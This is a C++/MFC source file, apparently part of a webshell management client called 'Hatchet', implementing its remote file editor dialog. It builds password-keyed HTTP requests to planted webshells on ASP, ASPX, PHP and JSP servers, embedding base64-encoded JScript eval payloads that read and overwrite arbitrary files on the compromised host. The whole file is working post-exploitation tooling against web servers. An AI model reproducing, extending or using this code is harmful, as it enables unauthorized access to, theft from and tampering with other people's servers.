// FileSave.cpp : 实现文件
//

#include "stdafx.h"
#include "Hatchet.h"
#include "FileSaveDlg.h"

// CFileSaveDlg 对话框
DWORD WINAPI GetContent(LPVOID lpParam);	//线程
DWORD WINAPI SaveContent(LPVOID lpParam);	//线程


IMPLEMENT_DYNAMIC(CFileSaveDlg, CDialog)

CFileSaveDlg::CFileSaveDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CFileSaveDlg::IDD, pParent)
{

}

CFileSaveDlg::~CFileSaveDlg()
{
	DestroyWindow();
}

void CFileSaveDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_FILESAVE_EDIT_FIND, m_FileSave_Edit_Find);
}


BEGIN_MESSAGE_MAP(CFileSaveDlg, CDialog)
	ON_EN_SETFOCUS(IDC_EDIT_FILEPATH, &CFileSaveDlg::OnEnSetfocusEditFilepath)
	ON_BN_CLICKED(IDC_SAVE, OnSave)
	ON_BN_CLICKED(IDC_GET_CONTENT, OnGetContent)
	ON_WM_SIZE()
END_MESSAGE_MAP()


// CFileSaveDlg 消息处理程序
BOOL CFileSaveDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();

	GetDlgItem(IDC_EDIT_FILEPATH)->SetFont(&m_FontSample);
	GetDlgItem(IDC_EDIT_FILECONTENT)->SetFont(&m_FontSample);
	GetDlgItem(IDC_FILESAVE_EDIT_FIND)->SetFont(&m_FontSample);
	GetDlgItem(IDC_SAVE)->SetFont(&m_FontSample);
	GetDlgItem(IDC_GET_CONTENT)->SetFont(&m_FontSample);

	m_edit.SetWindowText( "Document Content Management" );					//设置状态栏

	szSiteUrl	=	szGlobal_SiteUrl;
	szSitePass	=	szGlobal_SitePass;
	szSiteFileSave	=	szGlobal_SiteFileSave;
	nSiteScript	=	nGlobal_SiteScript;
	nSiteCode	=	nGlobal_SiteCode;

	nFindPos = -1;								//初始化，开始查找的位置
	GetDlgItem(IDC_EDIT_FILECONTENT)->SetFocus();
	((CEdit *)GetDlgItem(IDC_EDIT_FILECONTENT))->SetLimitText(-1);//UINT_MAX);

	if (szSiteFileSave[0] == '/')
	{
		IsWin = false;
	}else{
		IsWin = true;
	}
	if (szSiteFileSave.Find("^_^") != -1)	//是新建的文件，不需要获取内容
	{
		szSiteFileSave.Replace("^_^", "");
		bThreadFinish = true;	//初始化,04.02 BUG
	}else{
		GetDlgItem(IDC_GET_CONTENT)->EnableWindow(FALSE);
		GetDlgItem(IDC_SAVE)->EnableWindow(FALSE);

		bThreadFinish = false;
		szFilePath = szSiteFileSave;
		CreateThread(NULL, 0, GetContent, (LPVOID)this, 0, 0);		//获取文件内容
	}

	SetDlgItemText(IDC_EDIT_FILEPATH, szSiteFileSave);

	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}


void CFileSaveDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	CRect rcClient;
	GetClientRect(rcClient);

	CRect	rcCWnd = rcClient;
	CWnd*	pCWnd   =   GetDlgItem(IDC_GET_CONTENT);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 2;
		rcCWnd.bottom = 21;
		rcCWnd.right = 73;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_EDIT_FILEPATH);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 2;
		rcCWnd.bottom = 21;
		rcCWnd.left = 75;
		rcCWnd.right = rcCWnd.right-77;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_SAVE);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 2;
		rcCWnd.bottom = 21;
		rcCWnd.left = rcCWnd.right-75;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_EDIT_FILECONTENT);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 23;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_FILESAVE_EDIT_FIND);
	if (pCWnd != NULL)
	{
		rcCWnd.top = rcCWnd.bottom - 21;
		pCWnd->MoveWindow(rcCWnd);
	}
}



BOOL CFileSaveDlg::PreTranslateMessage(MSG* pMsg) 
{
	if(pMsg -> message == WM_KEYDOWN)
	{
		CString temp;
		if(pMsg -> wParam == VK_ESCAPE)
		{
			if ( GetDlgItem(IDC_FILESAVE_EDIT_FIND) == GetFocus() )	//搜索控件隐藏
			{
				CRect rcClient;
				GetClientRect(rcClient);
				CWnd	*pFindEdit   =   GetDlgItem(IDC_EDIT_FILECONTENT);

				if (pFindEdit != NULL)
				{
					rcClient.top = 21;
					pFindEdit->MoveWindow(rcClient);
				}
				m_FileSave_Edit_Find.ShowWindow(SW_HIDE);
				SetDlgItemText(IDC_FILESAVE_EDIT_FIND, "");
				GetDlgItem(IDC_EDIT_FILECONTENT)->SetFocus();
			}
			return TRUE;
		}
		if(pMsg -> wParam == VK_RETURN)
		{
			if ( GetDlgItem(IDC_EDIT_FILECONTENT) != GetFocus() )
			{
				if ( GetDlgItem(IDC_FILESAVE_EDIT_FIND) == GetFocus() )		//搜索
				{
					m_FileSave_Edit_Find.GetWindowText(szFindStr);
					CString szFindContent;
					GetDlgItemText(IDC_EDIT_FILECONTENT, szFindContent);
					if (szFindStr != "" && szFindContent != "")
					{
						int nPosX = szFindContent.Find(szFindStr, nFindPos+1);

						if (nPosX == -1)
						{
							if (nFindPos == -1)				//没有找到
							{
								m_edit.SetWindowText( "Can't find the text \""+ szFindStr +"\"" );					//设置状态栏
							}else{
								m_edit.SetWindowText( "Find complete!" );					//设置状态栏，查找完成
								nFindPos = -1;
							}
						}else{
							nFindPos = nPosX;
							GetDlgItem(IDC_EDIT_FILECONTENT)->SetFocus();
							((CEdit *)GetDlgItem(IDC_EDIT_FILECONTENT))->SetSel(nPosX, nPosX + szFindStr.GetLength());

							temp.Format("Find the text \"%s\", start position %d", szFindStr, nPosX);
							m_edit.SetWindowText( temp );					//设置状态栏
						}
					}
				}
				return TRUE;
			}else{					//继续查找
				int nStart,nEnd;
				((CEdit *)GetDlgItem(IDC_EDIT_FILECONTENT))->GetSel(nStart, nEnd);
				CString szFindContent;
				GetDlgItemText(IDC_EDIT_FILECONTENT, szFindContent);
				if (nEnd > nStart)
				{
					if (szFindContent.Mid(nStart, nEnd-nStart) == szFindStr)		//继续查找
					{
						int nPosX = szFindContent.Find(szFindStr, nFindPos+1);
						if (nPosX != -1)
						{
							nFindPos = nPosX;
							GetDlgItem(IDC_EDIT_FILECONTENT)->SetFocus();
							((CEdit *)GetDlgItem(IDC_EDIT_FILECONTENT))->SetSel(nPosX, nPosX + szFindStr.GetLength());

							temp.Format("Find the text \"%s\", start position %d", szFindStr, nPosX);
							m_edit.SetWindowText( temp );					//设置状态栏
						}else{
							m_edit.SetWindowText( "Find complete!" );					//设置状态栏，查找完成
							nFindPos = -1;
						}
						return TRUE;
					}
				}
			}
		}
		if ((pMsg->wParam == 'A' || pMsg->wParam == 'a') && ::GetKeyState(VK_CONTROL)&0x8000)
		{
			if ( GetDlgItem(IDC_EDIT_FILEPATH) == GetFocus() )						//全选
			{
				((CEdit *)GetDlgItem(IDC_EDIT_FILEPATH))->SetSel( 0, -1);//全选
			}

			if ( GetDlgItem(IDC_FILESAVE_EDIT_FIND) == GetFocus() )						//查找edit全选
			{
				((CEdit *)GetDlgItem(IDC_FILESAVE_EDIT_FIND))->SetSel( 0, -1);//全选
			}
			if ( GetDlgItem(IDC_EDIT_FILECONTENT) == GetFocus() )						//内容edit全选
			{
				((CEdit *)GetDlgItem(IDC_EDIT_FILECONTENT))->SetSel( 0, -1);//全选
			}
			return TRUE;
		}

		if ((pMsg->wParam == 'S' || pMsg->wParam == 's') && ::GetKeyState(VK_CONTROL)&0x8000)
		{
			if (MessageBox("Save file?", "", MB_OKCANCEL) == IDOK)
			{
				OnSave();//保存
			}
			return TRUE;
		}
		//////////////////////////////////////////////////////////////////////////
		if (pMsg->wParam == 'F' && (GetKeyState(VK_CONTROL)&0x8000))
		{
			int bVisible = GetDlgItem(IDC_FILESAVE_EDIT_FIND)->GetStyle() & WS_VISIBLE;
			CRect rcClient;
			GetClientRect(rcClient);
			CWnd	*pFindEdit   =   GetDlgItem(IDC_EDIT_FILECONTENT);

			if (bVisible)
			{
				if (pFindEdit != NULL)
				{
					rcClient.top = 21;
					pFindEdit->MoveWindow(rcClient);
				}
				m_FileSave_Edit_Find.ShowWindow(SW_HIDE);
				SetDlgItemText(IDC_FILESAVE_EDIT_FIND, "");
				GetDlgItem(IDC_EDIT_FILECONTENT)->SetFocus();
			}else{
				if (pFindEdit != NULL)
				{
					rcClient.top = 21;
					rcClient.bottom = rcClient.bottom - 21;
					pFindEdit->MoveWindow(rcClient);
				}
				m_FileSave_Edit_Find.ShowWindow(SW_SHOW);
				m_FileSave_Edit_Find.SetFocus();
			}
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CFileSaveDlg::OnEnSetfocusEditFilepath()
{
	((CEdit *)GetDlgItem(IDC_EDIT_FILEPATH))->SetSel(-1, 0, false);	//加载完成窗体,设置一下光标到最后
}

void CFileSaveDlg::OnGetContent()
{
	m_edit.SetWindowText( "Reading" );					//设置状态栏
	GetDlgItem(IDC_GET_CONTENT)->EnableWindow(FALSE);
	GetDlgItem(IDC_SAVE)->EnableWindow(FALSE);

	if (bThreadFinish)
	{
		bThreadFinish = false;
		GetDlgItemText(IDC_EDIT_FILEPATH, szFilePath);
		CreateThread(NULL, 0, GetContent, (LPVOID)this, 0, 0);		//获取文件内容
	}else{
		m_edit.SetWindowText( "GetContent Threads busy" );					//设置状态栏
	}
}

void CFileSaveDlg::OnSave() 
{
	m_edit.SetWindowText( "Saving" );					//设置状态栏
	GetDlgItem(IDC_GET_CONTENT)->EnableWindow(FALSE);
	GetDlgItem(IDC_SAVE)->EnableWindow(FALSE);

	if (bThreadFinish)
	{
		bThreadFinish = false;
		CreateThread(NULL, 0, SaveContent, (LPVOID)this, 0, 0);		//获取文件内容
	}else{
		m_edit.SetWindowText( "SaveContent Threads busy" );					//设置状态栏
	}
}

//////////////////////////////////////////////////////////////////////////

DWORD WINAPI GetContent(LPVOID lpParam)	//线程
{
	CFileSaveDlg* pDlg = (CFileSaveDlg*)lpParam;
	
	if (pDlg->szFilePath == "")
	{
		EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_GET_CONTENT),TRUE);
		EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_SAVE),TRUE);
		pDlg->bThreadFinish = true;
		return 0;
	}

	CString temp;
	CString szOnGetContentFormat;
	//pDlg->szFilePath.Replace("\\", "\\\\");	2015.01.20 IPC \\ BUG
	if (pDlg->nSiteScript == 1)								//	ASP
	{
		pDlg->szFilePath = UrlEnCode(pDlg->nSiteCode, pDlg->szFilePath, false, true);
		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szFileGetFileContent[pDlg->nSiteScript-1] + pDlg->szFilePath, pDlg->nSiteCode, temp, szError);
	}else if (pDlg->nSiteScript == 2)							// ASPX
	{
		pDlg->szFilePath = MyBase64Encode(pDlg->nSiteCode, pDlg->szFilePath);
		pDlg->szFilePath = szFileGetFileContent[pDlg->nSiteScript-1] + pDlg->szFilePath;
		szOnGetContentFormat.Format("%d", pDlg->nSiteCode);
		pDlg->szFilePath.Replace("%nPageCode%", szOnGetContentFormat);

		CString szBase64EvalCode = "var P=System.Text.Encoding.GetEncoding("+ szOnGetContentFormat +").GetString(System.Convert.FromBase64String(Request.Item[\"z1\"]));"
			"var m=new System.IO.StreamReader(P,Encoding.Default);Response.Write(m.ReadToEnd());m.Close();";
		szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
		pDlg->szFilePath.Replace("%szBase64EvalCode%", szBase64EvalCode);

		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + pDlg->szFilePath, pDlg->nSiteCode, temp, szError);
	}else if (pDlg->nSiteScript == 3)							// PHP
	{
		pDlg->szFilePath = MyBase64Encode(pDlg->nSiteCode, pDlg->szFilePath);
		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szFileGetFileContent[pDlg->nSiteScript-1] + pDlg->szFilePath, pDlg->nSiteCode, temp, szError);
	}else if(pDlg->nSiteScript == 4)
	{												// JSP
		if (pDlg->nSiteCode == 65001)
		{
			szOnGetContentFormat = "UTF-8";
		}
		else if (pDlg->nSiteCode == 936)
		{
			szOnGetContentFormat = "GB2312";
		}
		else if (pDlg->nSiteCode == 950)
		{
			szOnGetContentFormat = "BIG5";
		}
		pDlg->szFilePath = UrlEnCode(pDlg->nSiteCode, pDlg->szFilePath);
		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + "=C&z0="+ szOnGetContentFormat +"&z1="+ pDlg->szFilePath, pDlg->nSiteCode, temp, szError);
	}else{
		return false;
	}
	if (pDlg->m_hWnd == NULL)		//正在执行，如果关闭就崩溃了。
	{
		return 0;
	}
	if (!bHttpIsOK)
	{
		m_edit.SetWindowText( "Failed to get the file contents,"+ szError );					//设置状态栏
		return false;
	}else{
		m_edit.SetWindowText( "Get complete the file contents" );					//设置状态栏
		if (!pDlg->IsWin)
		{
			temp.Replace("\n","\r\n");					//Win \r\n   Linux \n
		}else{
			if (temp.Find("\r\n") == -1 && temp.Find("\n") != -1)
			{
				temp.Replace("\n","\r\n");
			}
		}
		pDlg->SetDlgItemText(IDC_EDIT_FILECONTENT, temp);
	}

	EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_GET_CONTENT),TRUE);
	EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_SAVE),TRUE);
	pDlg->bThreadFinish = true;
	return 0;
}

DWORD WINAPI SaveContent(LPVOID lpParam)	//线程
{
	CFileSaveDlg* pDlg = (CFileSaveDlg*)lpParam;

	CString temp;
	CString szOnSaveFileName,szOnSaveFileContent;
	CString szOnSaveFormat;
	pDlg->GetDlgItemText(IDC_EDIT_FILEPATH, szOnSaveFileName);
	pDlg->GetDlgItemText(IDC_EDIT_FILECONTENT, szOnSaveFileContent);
	//szOnSaveFileName.Replace("\\", "\\\\");	2015.01.20 IPC \\ BUG
	if (szOnSaveFileName == "")
	{
		EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_GET_CONTENT),TRUE);
		EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_SAVE),TRUE);
		pDlg->bThreadFinish = true;
		return 0;
	}

	if (!pDlg->IsWin)
	{
		szOnSaveFileContent.Replace("\r\n","\n");					//Win \r\n   Linux \n
	}

	if (pDlg->nSiteScript == 1)								//	ASP
	{
		szOnSaveFileName = UrlEnCode(pDlg->nSiteCode, szOnSaveFileName, false, true);
		szOnSaveFileContent = UrlEnCode(pDlg->nSiteCode, szOnSaveFileContent);
		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szFileSaveFileContent[pDlg->nSiteScript-1] + szOnSaveFileName +"&z2="+ szOnSaveFileContent, pDlg->nSiteCode, temp, szError);
	}else if (pDlg->nSiteScript == 2)							// ASPX
	{
		szOnSaveFileName = MyBase64Encode(pDlg->nSiteCode, szOnSaveFileName);
		szOnSaveFileContent = UrlEnCode(pDlg->nSiteCode, szOnSaveFileContent, false, true);

		szOnSaveFileName = szFileSaveFileContent[pDlg->nSiteScript-1] + szOnSaveFileName;
		szOnSaveFormat.Format("%d", pDlg->nSiteCode);
		szOnSaveFileName.Replace("%nPageCode%", szOnSaveFormat);

		CString szBase64EvalCode = "var Z2:String=Request.Item[\"z2\"];var B:byte[]=new byte[Z2.Length/2];for(var i:int=0;"
			"i<Z2.Length;i+=2){B[i/2]=byte(Convert.ToInt32(Z2.Substring(i,2),16));}var P=System.Tex"
			"t.Encoding.GetEncoding("+ szOnSaveFormat +").GetString(System.Convert.FromBase64String(Request.Item[\"z"
			"1\"]));var m=new System.IO.StreamWriter(P,false,Encoding.Default);m.Write(System.Text."
			"Encoding.Default.GetString(B));m.Close();Response.Write(\"1\");";
		szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
		szOnSaveFileName.Replace("%szBase64EvalCode%", szBase64EvalCode);

		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szOnSaveFileName +"&z2="+ szOnSaveFileContent, pDlg->nSiteCode, temp, szError);
	}else if (pDlg->nSiteScript == 3)							// PHP
	{
		szOnSaveFileName = MyBase64Encode(pDlg->nSiteCode, szOnSaveFileName);
		szOnSaveFileContent = MyBase64Encode(pDlg->nSiteCode, szOnSaveFileContent);
		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szFileSaveFileContent[pDlg->nSiteScript-1] + szOnSaveFileName +"&z2="+ szOnSaveFileContent, pDlg->nSiteCode, temp, szError);
	}else{												// JSP
		//1=D&z0=GB2312&z1=C%3A%5C%5CNewFile.txt&z2=11%0D%0A%CE%D2%C8%D5%0D%0A+%2Basdf%21%40%23%24%25%5E%26%2A%28%29_%2B%0D%0Aasdfg
		if (pDlg->nSiteCode == 65001)
		{
			szOnSaveFormat = "UTF-8";
		}
		else if (pDlg->nSiteCode == 936)
		{
			szOnSaveFormat = "GB2312";
		}
		else if (pDlg->nSiteCode == 950)
		{
			szOnSaveFormat = "BIG5";
		}
		szOnSaveFileName = UrlEnCode(pDlg->nSiteCode, szOnSaveFileName);
		szOnSaveFileContent = UrlEnCode(pDlg->nSiteCode, szOnSaveFileContent);
		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + "=D&z0="+ szOnSaveFormat +"&z1="+ szOnSaveFileName +"&z2="+ szOnSaveFileContent, pDlg->nSiteCode, temp, szError);
	}

	if (pDlg->m_hWnd == NULL)		//正在执行，如果关闭就崩溃了。
	{
		return 0;
	}
	if (!bHttpIsOK || temp != "1")
	{
		m_edit.SetWindowText( "Save the file fails,"+ temp );					//设置状态栏
	}else{
		m_edit.SetWindowText( "Save the file to complete" );					//设置状态栏
	}

	EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_GET_CONTENT),TRUE);
	EnableWindow(GetDlgItem(pDlg->GetSafeHwnd(),IDC_SAVE),TRUE);
	pDlg->bThreadFinish = true;
	return 0;
}
